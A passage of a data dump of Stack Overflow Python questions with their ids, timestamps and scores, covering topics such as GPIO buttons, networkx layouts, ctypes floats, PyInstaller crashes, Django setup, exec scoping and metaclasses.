<p>I am using the canonical decomposition as provided from the scikit-tensor library function cp_als. Also what is the expected dimensionality of the decomposed matrices?</p>
"
39785577,5740843.0,2016-09-30 07:03:15+00:00,12,Python button functions oddly not doing the same,"<p>I currently have 2 buttons hooked up to my Raspberry Pi (these are the ones with ring LED's in them) and I'm trying to perform this code</p>

<pre><code>#!/usr/bin/env python
import RPi.GPIO as GPIO
import time

GPIO.setmode(GPIO.BCM)
GPIO.setwarnings(False)
GPIO.setup(17, GPIO.OUT) #green LED
GPIO.setup(18, GPIO.OUT) #red LED
GPIO.setup(4, GPIO.IN, GPIO.PUD_UP) #green button
GPIO.setup(27, GPIO.IN, GPIO.PUD_UP) #red button

def remove_events():
        GPIO.remove_event_detect(4)
        GPIO.remove_event_detect(27)

def add_events():
        GPIO.add_event_detect(4, GPIO.FALLING, callback=green, bouncetime=800)
        GPIO.add_event_detect(27, GPIO.FALLING, callback=red, bouncetime=800)

def red(pin):
        remove_events()
        GPIO.output(17, GPIO.LOW)
        print ""red pushed""
        time.sleep(2)
        GPIO.output(17, GPIO.HIGH)
        add_events()

def green(pin):
        remove_events()
        GPIO.output(18, GPIO.LOW)
        print ""green pushed""
        time.sleep(2)
        GPIO.output(18, GPIO.HIGH)
        add_events()

def main():
    while True:
        print ""waiting""
        time.sleep(0.5)

GPIO.output(17, GPIO.HIGH)
GPIO.output(18, GPIO.HIGH)
GPIO.add_event_detect(4, GPIO.FALLING, callback=green, bouncetime=800)
GPIO.add_event_detect(27, GPIO.FALLING, callback=red, bouncetime=800)

if __name__ == ""__main__"":
    main()
</code></pre>

<p>On the surface it looks like a fairly easy script. When a button press is detected:</p>

<ol>
<li>remove the events</li>
<li>print the message </li>
<li>wait 2 seconds before adding the events and turning the LED's back on </li>
</ol>

<p>Which normally works out great when I press the green button. I tried it several times in succession and it works without fail. With the red, however, it works well the first time, and the second time, but after it has completed it second red(pin) cycle the script just stops.</p>

<p>Considering both events are fairly similar, I can't explain why it fails on the end of the 2nd red button.</p>

<p><strong>EDIT: I have changed the pins from red and green respectively (either to different pin's completely or swap them). Either way, it's always the red button code (actually now green button) causes an error. So it seems its' not a physical red button problem, nor a pin problem, this just leaves the code to be at fault...</strong></p>
"
39836725,90848.0,2016-10-03 17:00:54+00:00,12,"How does one add an item to GTK's ""recently used"" file list from Python?","<p>I'm trying to add to the ""recently used"" files list from Python 3 on Ubuntu.</p>

<p>I am able to successfully <em>read</em> the recently used file list like this:</p>

<pre><code>from gi.repository import Gtk
recent_mgr = Gtk.RecentManager.get_default()
for item in recent_mgr.get_items():
    print(item.get_uri())
</code></pre>

<p>This prints out the same list of files I see when I look at ""Recent"" in Nautilus, or look at the ""Recently Used"" place in the file dialog of apps like GIMP.</p>

<p>However, when I tried adding an item like this (where <code>/home/laurence/foo/bar.txt</code> is an existing text file)...</p>

<pre><code>recent_mgr.add_item('file:///home/laurence/foo/bar.txt')
</code></pre>

<p>...the file does not show up in the Recent section of Nautilus or in file dialogs. It doesn't even show up in the results returned by <code>get_items()</code>.</p>

<p>How can I add a file to GTK's recently used file list from Python?</p>
"
39667089,1634460.0,2016-09-23 18:10:01+00:00,11,Python vectorizing nested for loops,"<p>I'd appreciate some help in finding and understanding a pythonic way to optimize the following array manipulations in nested for loops:</p>

<pre><code>def _func(a, b, radius):
    ""Return 0 if a&gt;b, otherwise return 1""
    if distance.euclidean(a, b) &lt; radius:
        return 1
    else:
        return 0

def _make_mask(volume, roi, radius):
    mask = numpy.zeros(volume.shape)
    for x in range(volume.shape[0]):
        for y in range(volume.shape[1]):
            for z in range(volume.shape[2]):
                mask[x, y, z] = _func((x, y, z), roi, radius)
    return mask
</code></pre>

<p>Where <code>volume.shape</code> (182, 218, 200) and <code>roi.shape</code> (3,) are both <code>ndarray</code> types; and <code>radius</code> is an <code>int</code> </p>
"
39804034,3545237.0,2016-10-01 07:21:39+00:00,11,Python scraping of javascript web pages fails for https pages only,"<p>I'm using PyQt5 to scrape web pages, which works great for http:// URLs, but not at all for https:// URLs.</p>

<p>The relevant part of my script is below:</p>

<pre><code>class WebPage(QWebPage):
    def __init__(self):
        super(WebPage, self).__init__()

        self.timerScreen = QTimer()
        self.timerScreen.setInterval(2000)
        self.timerScreen.setSingleShot(True)
        self.timerScreen.timeout.connect(self.handleLoadFinished)

        self.loadFinished.connect(self.timerScreen.start)


    def start(self, urls):
        self._urls = iter(urls)
        self.fetchNext()

    def fetchNext(self):
        try:
            url = next(self._urls)
        except StopIteration:
            return False
        else:
            self.mainFrame().load(QUrl(url))
        return True

    def processCurrentPage(self):
        url = self.mainFrame().url().toString()
        html = self.mainFrame().toHtml()

        #Do stuff with html
        print('loaded: [%d bytes] %s' % (self.bytesReceived(), url))

    def handleLoadFinished(self):
        self.processCurrentPage()
        if not self.fetchNext():
            qApp.quit()
</code></pre>

<p>For secure pages, the script returns a blank page. The only html coming back is <code>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code>.</p>

<p>I'm at a bit of a loss. Is there a setting that I'm missing related to handling secure URLs?</p>
"
39801880,678572.0,2016-10-01 00:39:45+00:00,11,How to use the `pos` argument in `networkx` to create a flowchart-style Graph? (Python 3),"<p><strong>I am trying create a linear network graph using <code>Python</code></strong> (preferably with <code>matplotlib</code> and <code>networkx</code> although would be interested in <code>bokeh</code>) similar in concept to the one below.  </p>

<p><a href=""http://i.stack.imgur.com/qojHg.png""><img src=""http://i.stack.imgur.com/qojHg.png"" alt=""enter image description here""></a></p>

<p><strong>How can this graph plot be constructed efficiently (<code>pos</code>?) in Python using <code>networkx</code>?</strong>  I want to use this for more complicated examples so I feel that hard coding the positions for this simple example won't be useful :( . Does <code>networkx</code> have a solution to this? </p>

<blockquote>
  <p><a href=""https://networkx.github.io/documentation/development/reference/generated/networkx.drawing.nx_pylab.draw_networkx.html#networkx.drawing.nx_pylab.draw_networkx"">pos (dictionary, optional) â A dictionary with nodes as keys and
  positions as values. If not specified a spring layout positioning will
  be computed. See networkx.layout for functions that compute node
  positions.
  </a></p>
</blockquote>

<p>I haven't seen any tutorials on how this can be achieved in <code>networkx</code> which is why I believe this question will be a reliable resource for the community.  I've extensively gone through the <a href=""https://networkx.github.io/documentation/development/tutorial/index.html""><code>networkx</code> tutorials</a> and nothing like this is on there.  The layouts for <code>networkx</code> would make this type of network impossible to interpret without careful use of the <code>pos</code> argument... which I believe is my only option.  <strong>None of the precomputed layouts on the <a href=""https://networkx.github.io/documentation/networkx-1.9/reference/drawing.html"">https://networkx.github.io/documentation/networkx-1.9/reference/drawing.html</a> documentation seem to handle this type of network structure well.</strong> </p>

<p><strong>Simple Example:</strong></p>

<p>(A) every outer key is the iteration in the graph moving from left to the right (e.g. iteration 0 represents samples, iteration 1 has groups 1 - 3, same with iteration 2, iteration 3 has Groups 1 - 2, etc.).  (B) The inner dictionary contains the current grouping at that particular iteration, and the weights for the previous groups merging that represent the current group (e.g. <code>iteration 3</code> has <code>Group 1</code> and <code>Group 2</code> and for <code>iteration 4</code> all of <code>iteration 3's</code> <code>Group 2</code> has gone into <code>iteration 4's</code> <code>Group 2</code> but <code>iteration 3's</code> <code>Group 1</code> has been split up.  The weights always sum to 1. </p>

<p>My code for the connections w/ weights for the plot above:</p>

<pre><code>D_iter_current_previous =    {
        1: {
            ""Group 1"":{""sample_0"":0.5, ""sample_1"":0.5, ""sample_2"":0, ""sample_3"":0, ""sample_4"":0},
            ""Group 2"":{""sample_0"":0, ""sample_1"":0, ""sample_2"":1, ""sample_3"":0, ""sample_4"":0},
            ""Group 3"":{""sample_0"":0, ""sample_1"":0, ""sample_2"":0, ""sample_3"":0.5, ""sample_4"":0.5}
            },
        2: {
            ""Group 1"":{""Group 1"":1, ""Group 2"":0, ""Group 3"":0},
            ""Group 2"":{""Group 1"":0, ""Group 2"":1, ""Group 3"":0},
            ""Group 3"":{""Group 1"":0, ""Group 2"":0, ""Group 3"":1}
            },
        3: {
            ""Group 1"":{""Group 1"":0.25, ""Group 2"":0, ""Group 3"":0.75},
            ""Group 2"":{""Group 1"":0.25, ""Group 2"":0.75, ""Group 3"":0}
            },
        4: {
            ""Group 1"":{""Group 1"":1, ""Group 2"":0},
            ""Group 2"":{""Group 1"":0.25, ""Group 2"":0.75}
            }
        }
</code></pre>

<p><strong>This is what happened when I made the Graph in <code>networkx</code></strong>:</p>

<pre><code>import networkx
import matplotlib.pyplot as plt

# Create Directed Graph
G = nx.DiGraph()

# Iterate through all connections
for iter_n, D_current_previous in D_iter_current_previous.items():
    for current_group, D_previous_weights in D_current_previous.items():
        for previous_group, weight in D_previous_weights.items():
            if weight &gt; 0:
                # Define connections using `|__|` as a delimiter for the names
                previous_node = ""%d|__|%s""%(iter_n - 1, previous_group)
                current_node = ""%d|__|%s""%(iter_n, current_group)
                connection = (previous_node, current_node)
                G.add_edge(*connection, weight=weight)

# Draw Graph with labels and width thickness
nx.draw(G, with_labels=True, width=[G[u][v]['weight'] for u,v in G.edges()])
</code></pre>

<p><a href=""http://i.stack.imgur.com/aiXnI.png""><img src=""http://i.stack.imgur.com/aiXnI.png"" alt=""enter image description here""></a></p>

<p>Note: The only other way, I could think of to do this would be in <code>matplotlib</code> creating a scatter plot with every tick representing a iteration (5 including the initial samples) then connecting the points to each other with different weights.  This would be some pretty messy code especially trying to line up the edges of the markers w/ the connections...However, I'm not sure if this and <code>networkx</code> is the best way to do it or if there is a tool (e.g. <code>bokeh</code> or <code>plotly</code>) that is designed for this type of plotting.</p>
"
40055835,2558506.0,2016-10-15 06:36:16+00:00,11,Removing elements from an array that are in another array,"<p>Say I have these 2D arrays A and B.</p>

<p>How can I remove elements from A that are in B.</p>

<pre><code>A=np.asarray([[1,1,1], [1,1,2], [1,1,3], [1,1,4]])
B=np.asarray([[0,0,0], [1,0,2], [1,0,3], [1,0,4], [1,1,0], [1,1,1], [1,1,4]])
#output = [[1,1,2], [1,1,3]]
</code></pre>

<hr>

<p>To be more precise, I would like to do something like this.</p>

<pre><code>data = some numpy array
label = some numpy array
A = np.argwhere(label==0) #[[1 1 1], [1 1 2], [1 1 3], [1 1 4]]
B = np.argwhere(data&gt;1.5) #[[0 0 0], [1 0 2], [1 0 3], [1 0 4], [1 1 0], [1 1 1], [1 1 4]]
out = np.argwhere(label==0 and data&gt;1.5) #[[1 1 2], [1 1 3]]
</code></pre>
"
40102274,7019936.0,2016-10-18 07:38:00+00:00,10,Using a C function in Python,"<p>I've tried all the solutions mentioned on the internet so far nothing worked for me.</p>

<p>I have a python code, to speed it up, I want that my code runs the heavy calculations in a C function.
I already wrote this C function.</p>

<p>Then, to share the library, I did this in the terminal :</p>

<pre><code>gcc -shared -Wl,-install_name,testlib.so -o testlib.so -fPIC myModule.c
</code></pre>

<p>which returns no error. The problem; comes when i try to launch the C function in python. Let's consider the following simple function in C :</p>

<pre><code>int multiplier(int a, int b)
{

int lol = 0;

lol = a*b;

return lol;
}
</code></pre>

<p>I launch python3 (3.5.2), and then :</p>

<pre><code>import ctypes
zelib = ctypes.CDLL(""/Users/longeard/Desktop/Codes/DraII/testlib.so"",ctypes.RTLD_GLOBAL)
</code></pre>

<p>The library should be ready to use in python by doing :</p>

<pre><code>res = zelib.multiplier(2,3)
</code></pre>

<p>When doing that, it works and python returns </p>

<pre><code>6
</code></pre>

<p>Problem is, that the function i want to use ( the multiplier function I use is just for the example ) is supposed to take floats as input and return a float. But if I now consider the same multiplier function as before but with float :</p>

<pre><code>float multiplier(float a, float b)
{

float lol = 0.0;

lol = a*b;

return lol;
}
</code></pre>

<p>I recompile using gcc, I reimport ctypes and re-do ctypes.CDLL, and I do in python3 :</p>

<pre><code>zelib.multiplier(ctypes.c_float(2),ctypes.c_float(3))
</code></pre>

<p>(the types.c_float are here to convert the 2 in python into a float in C ), python will return :</p>

<pre><code>2
</code></pre>

<p>This is weird because if I add a printf within the function to print lol, python will print :</p>

<pre><code>  6.0
</code></pre>

<p>but still return 2, or 18 sometimes. Even though I printf and return the same variable ""lol"".</p>

<p>I tried a lot of things, and none of it worked. Do somebody have a idea please ? Thank You.</p>
"
39765738,4751968.0,2016-09-29 08:54:47+00:00,10,Blaze with Scikit Learn K-Means,"<p>I am trying to fit Blaze data object to scikit kmeans function.</p>

<pre><code>from blaze import *
from sklearn.cluster import KMeans
data_numeric = Data('data.csv')
data_cluster = KMeans(n_clusters=5)
data_cluster.fit(data_numeric)
</code></pre>

<p>Data Sample:</p>

<pre><code>A  B  C
1  32 34
5  57 92
89 67 21
</code></pre>

<p>Its throwing error :</p>

<p><a href=""http://i.stack.imgur.com/g3IBI.png.""><img src=""http://i.stack.imgur.com/g3IBI.png."" alt=""enter image description here""></a></p>

<p>I have been able to do it with Pandas Dataframe. Any way to feed blaze object to this function ?</p>
"
39756807,1294529.0,2016-09-28 20:11:22+00:00,10,Make a non-blocking request with requests when running Flask with Gunicorn and Gevent,"<p>My Flask application will receive a request, do some processing, and then make a request to a slow external endpoint that takes 5 seconds to respond.  It looks like running Gunicorn with Gevent will allow it to handle many of these slow requests at the same time.  How can I modify the example below so that the view is non-blocking?</p>

<pre><code>import requests

@app.route('/do', methods = ['POST'])
def do():
    result = requests.get('slow api')
    return result.content
</code></pre>

<pre class=""lang-none prettyprint-override""><code>gunicorn server:app -k gevent -w 4
</code></pre>
"
39647658,4400277.0,2016-09-22 19:45:06+00:00,10,Executable made with pyInstaller/UPX experiences QtCore4.dll error,"<p>A python program, which I compiled with <a href=""https://pyinstaller.readthedocs.io"">pyInstaller</a>, turned out to be over 400 MB. The program's GUI is based on <a href=""https://amol-mandhane.github.io/htmlPy/"">htmlPY</a>, which is ""a wrapper around PySide's QtWebKit library."" The large size of the program partly owes to the fact that it utilizes numpy, scipy, and nltk, and in part due to the graphics libraries.</p>

<p>To minimize the size of the program, I installed <a href=""https://github.com/upx/upx/releases/tag/v3.91"">UPX</a>. This decreased the size of the program to slightly over 100MB, which is large, but acceptable. </p>

<p>The first problem is that pyInstaller didn't detect htmlPy, and didn't include it in the compiled program. This can be fixed by copying the htmlPy module from my Python installation, into the 'dist' directory created by pyInstaller. After doing this, the version of the program compiled without UPX, was working fine.</p>

<p>After adding htmlPy to the 'dist' directory, running the executable crashes the program at the point when the GUI is created. I'm not sure if this is due to a problematic interaction between UPX and QT, or between UPX, QT, and htmlPy. The Windows ""Problem Signature"" is the following:</p>

<pre><code>Problem signature:
  Problem Event Name:   APPCRASH
  Application Name: main.exe
  Application Version:  0.0.0.0
  Application Timestamp:    00000000
  Fault Module Name:    QtCore4.dll
  Fault Module Version: 4.8.7.0
  Fault Module Timestamp:   561e435a
  Exception Code:   c0000005
  Exception Offset: 000000000010883a
</code></pre>

<p>Any ideas as to what's going on here, and how to fix it?</p>

<p><strong>EDIT:</strong></p>

<p>These are the contents of my .spec file:</p>

<pre><code># -*- mode: python -*-

block_cipher = None

added_files = [
     ( 'htmlPy/binder.js', 'htmlPy' ),
     ( 'templates/*', 'templates' ),
   ]
a = Analysis(['main.py'],
             pathex=['C:\\..\\My_App'],
             binaries=None,
             datas=added_files,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=['rthook_pyqt4.py'],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          exclude_binaries=True,
          name='My_App',
          debug=False,
          strip=False,
          upx=True,
          console=True )
coll = COLLECT(exe,
               a.binaries,
               a.zipfiles,
               a.datas,
               strip=False,
               upx=True,
               name='My_App')
</code></pre>

<p>These are the contents of rthook_pyqt4.py:</p>

<pre><code>import sip

sip.setapi(u'QDate', 2)
sip.setapi(u'QDateTime', 2)
sip.setapi(u'QString', 2)
sip.setapi(u'QTextStream', 2)
sip.setapi(u'QTime', 2)
sip.setapi(u'QUrl', 2)
sip.setapi(u'QVariant', 2)
</code></pre>

<p><strong>Edit 2:</strong></p>

<p>Here's some of the initialization code (<a href=""https://htmlpy.readthedocs.io/en/master/quickstart.html"">standard htmlPy fare</a>):</p>

<pre><code>app.static_path = path.join(BASE_DIR, ""static/"")
print ""Step 1""
app.template_path = path.join(BASE_DIR, ""templates/"")
print ""Step 2""
app.template = (""index.html"", {""username"": ""htmlPy_user""})
print ""Step 3""
...
</code></pre>

<p>The program crashes before it gets to Step 3.</p>
"
39672565,5132238.0,2016-09-24 04:39:26+00:00,10,what could cause html and script to behave different across iterations of a for loop?,"<p>I'm trying to build a side navigation bar where categories are listed and upon clicking a category a respective sub list of subcategories is shown right below the category. And if the category is clicked again, the sub list contracts.</p>

<p>So I'm running a loop across category objects. Inside this outer loop, I'm including a an inner loop to list subcategories and a script that hides the submenu and slidetoggles it only when a category is clicked. I'm using django template tags to dynamically assign class names for my html elements and also to refer to them in the script. So after all for loop iterations, there is a list of subcategory and a dedicated script for each category and they have unique class names so no chance of an overlap. So the weird part is, this works perfectly for most categories, but some of the categories and their submenu remain open and when clicked on the category the page reloads.</p>

<p>I don't get it, what could cause the exact same code (run in a for loop) to behave so differently?</p>

<p>This is my code:</p>

<pre><code>{% load staticfiles %}
{% load i18n pybb_tags forumindexlistbycat %}
{% catindexlist as catindexlisted %}

{% block body %}&lt;div class=""col-sm-12 col-md-12 col-xs-12 col-lg-12 body-container leftsidenavigator"" style=""margin-top:15px;""&gt;
    &lt;div class=""col-sm-12 col-md-12 col-xs-12 col-lg-12 leftsidenavigator-inner"" style=""padding:0px;""&gt;
         &lt;h2&gt;&lt;center&gt;Categories&lt;/center&gt;&lt;/h2&gt;
             &lt;ul class=""catindexlist catlistcat nav-collapse89""&gt;
                   {% for category in catindexlisted %}
                         &lt;li class=""catindexlistitem category-name{{category.name}}{{category.name}}"" style=""font-weight:600;padding-right:20px;""&gt;&lt;a href=""""&gt;{{category.name}}&lt;/a&gt;&lt;/li&gt;
                         &lt;ul style=""padding:0px;"" class=""nav-collapse88""&gt;
                         {% for forum in category|forumindexlistbycat %}
                               &lt;li class=""catlistforum{{category.name}}{{category.name}} forum-name"" style=""padding-right:10px;""&gt;&lt;a href=""{{ forum.get_absolute_url }}""&gt;{{forum.name}}&lt;/a&gt;&lt;/li&gt;
                         {% endfor %}&lt;/ul&gt;&lt;script&gt;

                         $(function() {
                              $("".catlistforum{{category.name}}{{category.name}}"").hide();
                                    $("".category-name{{category.name}}{{category.name}} a"").click(function(e) {
                                     e.preventDefault();
                                     $("".catlistforum{{category.name}}{{category.name}}"").slideToggle();
                                          if(!($(this).parent('li').siblings('div').children('ul').children('div').is("":visible""))){
                                              $(this).parent('li').siblings('div').children('ul').children('div').is("":visible"").slideToggle();
                                          }});
                                      })
                                &lt;/script&gt;
                           {% endfor %}
                           &lt;/ul&gt;
                      &lt;/div&gt;
                      &lt;/div&gt;
                  {% endblock %}
     {% block theme_script %}&lt;script src=""{% static ""pinax/js/theme.js"" %}""&gt;&lt;/script&gt;{% endblock %}
</code></pre>
"
39704298,633961.0,2016-09-26 13:32:10+00:00,9,How to call django.setup() in console_script?,"<p>The current django docs tell me this:</p>

<blockquote>
  <p>django.setup() may only be called once.</p>
  
  <p>Therefore, avoid putting reusable application logic in standalone scripts so that you have to import from the script elsewhere in your application. If you canât avoid that, put the call to django.setup() inside an if block:</p>
</blockquote>

<pre><code>if __name__ == '__main__':
    import django
    django.setup()
</code></pre>

<p>Source: <a href=""https://docs.djangoproject.com/en/1.10/topics/settings/#calling-django-setup-is-required-for-standalone-django-usage"">Calling django.setup() is required for âstandaloneâ Django usage</a></p>

<p>I am using entry points in setup.py. This way I don't have <code>__name__ == '__main__'</code>.</p>

<h1>Question</h1>

<p>How to ensure django.setup() gets only called once if you use <a href=""http://python-packaging.readthedocs.io/en/latest/command-line-scripts.html#the-console-scripts-entry-point"">console_scripts</a>?</p>

<p>Where should I put <code>django.setup()</code>?</p>

<h1>Background</h1>

<p>The actual error I have: Django hangs. Here is the reason: <a href=""https://code.djangoproject.com/ticket/27176"">https://code.djangoproject.com/ticket/27176</a></p>

<p>I want to port my application to the current django version. Changing to a management command is not an option, since other (third party applications) rely on the existence of my console scripts.</p>
"
39665286,2239897.0,2016-09-23 16:14:31+00:00,9,Is there a difference between str function and percent operator in Python,"<p>When converting an object to a string in python, I saw two different idioms:</p>

<p>A: <code>mystring = str(obj)</code></p>

<p>B: <code>mystring = ""%s"" % obj</code></p>

<p>Is there a difference between those two? (Reading the Python docs, I would suspect no, because the latter case would implicitly call <code>str(obj)</code> to convert <code>obj</code> to a string.</p>

<p>If yes, when should I use which? </p>

<p>If no, which one should I prefer in ""good"" python code? (From the python philosophy ""explicit over implicit"", A would be considered the better one?)</p>
"
39844100,5680587.0,2016-10-04 04:19:43+00:00,9,How can I write a C function that takes either an int or a float?,"<p>I want to create a function in C that extends Python that can take inputs of either float or int type. So basically, I want <code>f(5)</code> and <code>f(5.5)</code> to be acceptable inputs.</p>

<p>I don't think I can use <code>if (!PyArg_ParseTuple(args, ""i"", $value))</code> because it only takes only int or only float.</p>

<p>How can I make my function allow inputs that are either ints or floats?</p>

<p>I'm wondering if I should just take the input and put it into a PyObject and somehow take the type of the PyObject - is that the right approach?</p>
"
39781887,2517985.0,2016-09-30 00:22:10+00:00,9,How can i simplify this condition in python?,"<p>Do you know a simpler way to achieve the same result as this?
I have this code:</p>

<pre><code>color1 = input(""Color 1: "")
color2 = input(""Color 2: "")

if ((color1==""blue"" and color2==""yellow"") or (color1==""yellow"" and color2==""blue"")):
            print(""{0} + {1} = Green"".format(color1, color2))
</code></pre>

<p>I also tried with this:</p>

<pre><code>if (color1 + color2 ==""blueyellow"" or color1 + color2 ==""yellowblue"")
</code></pre>
"
39614777,3809375.0,2016-09-21 11:04:15+00:00,9,How to draw a proper grid on PyQt?,"<p>Let's consider this little snippet:</p>

<pre><code>import sys
from PyQt5 import QtWidgets, QtCore, QtGui


class Settings():

    WIDTH = 20
    HEIGHT = 15
    NUM_BLOCKS_X = 10
    NUM_BLOCKS_Y = 8


class QS(QtWidgets.QGraphicsScene):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        width = Settings.NUM_BLOCKS_X * Settings.WIDTH
        height = Settings.NUM_BLOCKS_Y * Settings.HEIGHT
        self.setSceneRect(0, 0, width, height)
        self.setItemIndexMethod(QtWidgets.QGraphicsScene.NoIndex)


class QV(QtWidgets.QGraphicsView):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def drawBackground(self, painter, rect):
        gr = rect.toRect()
        start_x = gr.left() + Settings.WIDTH - (gr.left() % Settings.WIDTH)
        start_y = gr.top() + Settings.HEIGHT - (gr.top() % Settings.HEIGHT)
        painter.save()
        painter.setPen(QtGui.QColor(60, 70, 80).lighter(90))
        painter.setOpacity(0.7)

        for x in range(start_x, gr.right(), Settings.WIDTH):
            painter.drawLine(x, gr.top(), x, gr.bottom())

        for y in range(start_y, gr.bottom(), Settings.HEIGHT):
            painter.drawLine(gr.left(), y, gr.right(), y)

        painter.restore()

        super().drawBackground(painter, rect)

if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    a = QS()
    b = QV()
    b.setScene(a)
    # b.resize(800,600)
    b.show()
    sys.exit(app.exec_())
</code></pre>

<p>If we run it we can see the number block of grids is ok, as specified it's 8x10:</p>

<p><a href=""http://i.stack.imgur.com/hNctJ.png""><img src=""http://i.stack.imgur.com/hNctJ.png"" alt=""enter image description here""></a></p>

<p>Now, let's say i set <code>NUM_BLOCKS_X=3</code> and <code>NUM_BLOCKS_Y=2</code>, the output will be this one:</p>

<p><a href=""http://i.stack.imgur.com/WfTNd.png""><img src=""http://i.stack.imgur.com/WfTNd.png"" alt=""enter image description here""></a></p>

<p>That's wrong! I definitely don't want that, I'd like the QGraphicsView to be shrinked properly to the grid's settings I've specified. </p>

<p><strong>1st Question:</strong> How can i achieve that?</p>

<p>Another thing I'd like to know is, let's consider the posted snippet where the grid is 10x8 and then let's resize the QGraphicsWidget to 800x600, the output will be:</p>

<p><a href=""http://i.stack.imgur.com/uCsuw.png""><img src=""http://i.stack.imgur.com/uCsuw.png"" alt=""enter image description here""></a></p>

<p>But I'd like to know how i can draw only the QGraphicsScene region. Right now I'm using <code>rect</code> in drawBackground.</p>

<p><strong>So my 2nd question is</strong>: How can I draw the grid only inside QGraphicsScene's region?</p>
"
39732027,3543200.0,2016-09-27 18:37:25+00:00,9,python's `timeit` doesn't always scale linearly with number?,"<p>I'm running Python 2.7.10 on a 16GB, 2.7GHz i5, OSX 10.11.5 machine. </p>

<p>I've observed this phenomenon many times in many different types of examples, so the example below, though a bit contrived, is representative. It's just what I happened to be working on earlier today when my curiosity finally piqued.  </p>

<pre><code>&gt;&gt;&gt; timeit('unicodedata.category(chr)', setup = 'import unicodedata, random; chr=unichr(random.randint(0,50000))', number=100)
3.790855407714844e-05
&gt;&gt;&gt; timeit('unicodedata.category(chr)', setup = 'import unicodedata, random; chr=unichr(random.randint(0,50000))', number=1000)
0.0003371238708496094
&gt;&gt;&gt; timeit('unicodedata.category(chr)', setup = 'import unicodedata, random; chr=unichr(random.randint(0,50000))', number=10000)
0.014712810516357422
&gt;&gt;&gt; timeit('unicodedata.category(chr)', setup = 'import unicodedata, random; chr=unichr(random.randint(0,50000))', number=100000)
0.029777050018310547
&gt;&gt;&gt; timeit('unicodedata.category(chr)', setup = 'import unicodedata, random; chr=unichr(random.randint(0,50000))', number=1000000)
0.21139287948608398
</code></pre>

<p>You'll notice that, from 100 to 1000, there's a factor of 10 increase in the time, as expected. However, 1e3 to 1e4, it's more like a factor of 50, and then a factor of 2 from 1e4 to 1e5 (so a total factor of 100 from 1e3 to 1e5, which is expected). </p>

<p>I'd figured that there must be some sort of caching-based optimization going on either in the actual process being timed or in <code>timeit</code> itself, but I can't quite figure out empirically whether this is the case. The imports don't seem to matter, as can be observed this with a most basic example:</p>

<pre><code>&gt;&gt;&gt; timeit('1==1', number=10000)
0.0005490779876708984
&gt;&gt;&gt; timeit('1==1', number=100000)
0.01579904556274414
&gt;&gt;&gt; timeit('1==1', number=1000000)
0.04653501510620117
</code></pre>

<p>where from 1e4 to 1e6 there's a true factor of 1e2 time difference, but the intermediate steps are ~30 and ~3. </p>

<p>I could do more ad hoc data collection but I haven't got a hypothesis in mind at this point. </p>

<p>Any notion as to why the non-linear scale at certain intermediate numbers of runs?</p>
"
39647566,2937831.0,2016-09-22 19:39:34+00:00,9,Why does Python 3 exec() fail when specifying locals?,"<p>The following executes without an error in Python 3:</p>

<pre><code>code = """"""
import math

def func(x):
    return math.sin(x)

func(10)
""""""
_globals = {}
exec(code, _globals)
</code></pre>

<p>But if I try to capture the local variable dict as well, it fails with a <code>NameError</code>:</p>

<pre><code>&gt;&gt;&gt; _globals, _locals = {}, {}
&gt;&gt;&gt; exec(code, _globals, _locals)
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
&lt;ipython-input-9-aeda81bf0af1&gt; in &lt;module&gt;()
----&gt; 1 exec(code, {}, {})

&lt;string&gt; in &lt;module&gt;()

&lt;string&gt; in func(x)

NameError: name 'math' is not defined
</code></pre>

<p>Why is this happening, and how can I execute this code while capturing both global and local variables?</p>
"
40029807,99989.0,2016-10-13 19:54:43+00:00,8,Why does the class definition's metaclass keyword argument accept a callable?,"<h2>Background</h2>

<p>The Python 3 <a href=""https://docs.python.org/3.6/reference/datamodel.html#determining-the-appropriate-metaclass"">documentation</a> clearly describes how the metaclass of a class is determined:</p>

<blockquote>
  <ul>
  <li>if no bases and no explicit metaclass are given, then type() is used</li>
  <li>if an explicit metaclass is given and it is not an instance of type(), then it is used directly as the metaclass</li>
  <li>if an instance of type() is given as the explicit metaclass, or bases are defined, then the most derived metaclass is used</li>
  </ul>
</blockquote>

<p>Therefore, according to the second rule, it is possible to specify a metaclass using a callable.  E.g.,</p>

<pre><code>class MyMetaclass(type):
    pass

def metaclass_callable(name, bases, namespace):
    print(""Called with"", name)
    return MyMetaclass(name, bases, namespace)

class MyClass(metaclass=metaclass_callable):
    pass

class MyDerived(MyClass):
    pass

print(type(MyClass), type(MyDerived))
</code></pre>

<h2>Question 1</h2>

<p>Is the metaclass of <code>MyClass</code>: <code>metaclass_callable</code> or <code>MyMetaclass</code>?  The second rule in the documentation says that the provided callable ""is used directly as the metaclass"".  However, it seems to make more sense to say that the metaclass is <code>MyMetaclass</code> since</p>

<ul>
<li><code>MyClass</code> and <code>MyDerived</code> have type <code>MyMetaclass</code>,</li>
<li><code>metaclass_callable</code> is called once and then appears to be unrecoverable,</li>
<li>derived classes do not use (as far as I can tell) <code>metaclass_callable</code> in any way (they use <code>MyMetaclass</code>).</li>
</ul>

<h2>Question 2</h2>

<p>Is there anything you can do with a callable that you can't do with an instance of <code>type</code>?  What is the purpose of accepting an arbitrary callable?</p>
"
39824381,3785114.0,2016-10-03 03:54:02+00:00,8,Spark problems with imports in Python,"<p>We are running a spark-submit command on a python script that uses Spark to parallelize object detection in Python using Caffe. The script itself runs perfectly fine if run in a Python-only script, but it returns an import error when using it with Spark code. I know the spark code is not the problem because it works perfectly fine on my home machine, but it is not functioning well on AWS. I am not sure if this somehow has to do with the environment variables, it is as if it doesn't detect them.</p>

<p>These environment variables are set:  </p>

<pre><code>SPARK_HOME=/opt/spark/spark-2.0.0-bin-hadoop2.7
PATH=$SPARK_HOME/bin:$PATH
PYTHONPATH=$SPARK_HOME/python/:$PYTHONPATH
PYTHONPATH=/opt/caffe/python:${PYTHONPATH}
</code></pre>

<p>Error:</p>

<pre><code>16/10/03 01:36:21 WARN TaskSetManager: Lost task 0.0 in stage 0.0 (TID 0, 172.31.50.167): org.apache.spark.api.python.PythonException: Traceback (most recent call last):
